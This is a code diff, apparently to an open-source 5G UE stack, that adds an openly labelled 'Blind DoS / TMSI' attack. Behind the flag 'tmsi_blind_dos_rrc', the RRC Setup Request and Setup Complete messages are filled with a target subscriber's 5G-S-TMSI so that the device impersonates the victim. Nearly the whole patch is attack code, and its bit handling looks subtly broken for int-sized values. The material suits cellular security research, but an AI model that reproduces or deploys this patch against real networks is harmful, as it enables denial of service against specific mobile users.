@@ -143,6 +143,8 @@
 #include "common/ran_context.h"
 #include "conversions.h"
 
+#include "attack_extern.h"	/* tmsi_blind_dos_rrc rrc_911 */
+
 //#define XER_PRINT
 
 typedef struct xer_sprint_string_s {
@@ -778,7 +780,21 @@ int do_RRCSetupRequest(uint8_t *buffer, size_t buffer_size, uint8_t *rv)
   c1->present = NR_UL_CCCH_MessageType__c1_PR_rrcSetupRequest;
   asn1cCalloc(c1->choice.rrcSetupRequest, rrcSetupRequest);
 
-  if (1) {
+  if (tmsi_blind_dos_rrc /* != 0 */) {
+    int tmsi = tmsi_blind_dos_rrc << 1; // TMSI needs to be shifted because the TMSI buffer is 39 bits
+    int buf_size = 5;
+    LOG_I(NR_RRC, "[Blind DoS / TMSI] RRC Setup Request, target TMSI: %d\n", tmsi);
+    rrcSetupRequest->rrcSetupRequest.ue_Identity.present = NR_InitialUE_Identity_PR_ng_5G_S_TMSI_Part1;
+    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.size = buf_size;
+    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.bits_unused = 0;
+    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.buf = CALLOC(1, buf_size);
+    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.buf[0] = (tmsi & 0xff00000000) >> 32;
+    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.buf[1] = (tmsi & 0x00ff000000) >> 24;
+    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.buf[2] = (tmsi & 0x0000ff0000) >> 16;
+    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.buf[3] = (tmsi & 0x000000ff00) >> 8;
+    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.buf[4] = (tmsi & 0x00000000ff) >> 0;
+  }
+  else if (1) {
     rrcSetupRequest->rrcSetupRequest.ue_Identity.present = NR_InitialUE_Identity_PR_randomValue;
     BIT_STRING_t *str = &rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.randomValue;
     str->size = 5;
@@ -900,12 +916,26 @@ uint8_t do_RRCSetupComplete(uint8_t *buffer,
   stmsi->size = 6;
   stmsi->buf = calloc(stmsi->size, sizeof(*stmsi->buf));
   AssertFatal(stmsi->buf != NULL, "out of memory\n");
-  stmsi->buf[0] = 0x12;
-  stmsi->buf[1] = 0x34;
-  stmsi->buf[2] = 0x56;
-  stmsi->buf[3] = 0x78;
-  stmsi->buf[4] = 0x9A;
-  stmsi->buf[5] = 0xBC;
+
+  if (tmsi_blind_dos_rrc /* != 0 */) {
+    int tmsi = tmsi_blind_dos_rrc;
+    LOG_I(NR_RRC, "[Blind DoS / TMSI] RRC Setup Complete, target TMSI: %d\n", tmsi);
+    stmsi->buf[0] = (tmsi & 0xff0000000000) >> 40;
+    stmsi->buf[1] = (tmsi & 0x00ff00000000) >> 32;
+    stmsi->buf[2] = (tmsi & 0x0000ff000000) >> 24;
+    stmsi->buf[3] = (tmsi & 0x000000ff0000) >> 16;
+    stmsi->buf[4] = (tmsi & 0x00000000ff00) >> 8;
+    stmsi->buf[5] = (tmsi & 0x0000000000ff) >> 0;
+  }
+  else {
+    // why hardcode?
+    stmsi->buf[0] = 0x12;
+    stmsi->buf[1] = 0x34;
+    stmsi->buf[2] = 0x56;
+    stmsi->buf[3] = 0x78;
+    stmsi->buf[4] = 0x9A;
+    stmsi->buf[5] = 0xBC;
+  }
 
   memset(&ies->dedicatedNAS_Message,0,sizeof(OCTET_STRING_t));
   OCTET_STRING_fromBuf(&ies->dedicatedNAS_Message, dedicatedInfoNAS, dedicatedInfoNASLength);
